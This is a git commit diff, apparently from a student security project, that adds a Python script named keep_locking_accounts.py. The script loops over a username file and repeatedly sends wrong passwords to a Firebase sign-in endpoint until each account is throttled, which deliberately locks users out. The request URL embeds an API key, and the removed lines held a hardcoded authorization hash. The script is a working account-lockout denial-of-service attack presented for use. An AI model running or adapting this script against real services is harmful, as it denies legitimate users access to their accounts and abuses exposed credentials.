db361e1fc865a035ed9729d1fe3df30cb9d29437
Firecon123 <137738719+Firecon123@users.noreply.github.com>
2025-11-01 16:49:12 -0400

    keeping users locked out

--- attack/keep_locking_accounts.py
+++ attack/keep_locking_accounts.py
@@ -1,27 +1,38 @@
-import requests
+import httpx
 
+def attack_account(username):
+    url = "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyBi1SphhzJG0C17iJMOdPEEj2Vxu0F4ESU"
 
-
-def get_user_accounts():
-    accounts = []
-    
-    headers = {
-        'Authorization': '{"hash":"ea91c027e512f677a16c742ec3d4baa52a94b657be9431012ef6068e21859490","salt":"STATIC SALT EVERY DEVICE THAT USER LOG-IN TO PAGE TO HAVE THE SAME ONE","iterations":100000,"timestamp":1761592723004}',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+    payload = {
+        "email": username,
+        "password": "Lockout1*"
     }
-    url = 'https://cse418-project-mirror.pages.dev/friendPage'
-
-    response = requests.get(url, headers=headers)
-    print("status code" , response.status_code)
-    print("headers" , response.headers)
     
-    return accounts
+    while True:
+        response = httpx.post(url, json=payload)
+        data = response.json()
 
-async def attack_account(username):
-    pass
-
+        if "error" in data:
+            if data["error"]["message"] == "INVALID_LOGIN_CREDENTIALS":
+                print(f"failed to login {username}")
+            elif data["error"]["message"] == "TOO_MANY_ATTEMPTS_TRY_LATER":
+                print(f"attack worked on {username}")
+                return 0
+        else:
+            print("Login successful")
+        
 def master():
-    pass
-
+    while True:
+        with open("./attack/mock_usernames.txt" , "r") as f:
+            for username in f:
+                try:
+                    attack_account(username)
+                    print(f"successfully attacked {username}")
+                except Exception as e:
+                    print(f"{e}: failed to attack {username}")
+                    
+                
+                
+                
 if __name__ == "__main__":
-    get_user_accounts()
+    master()
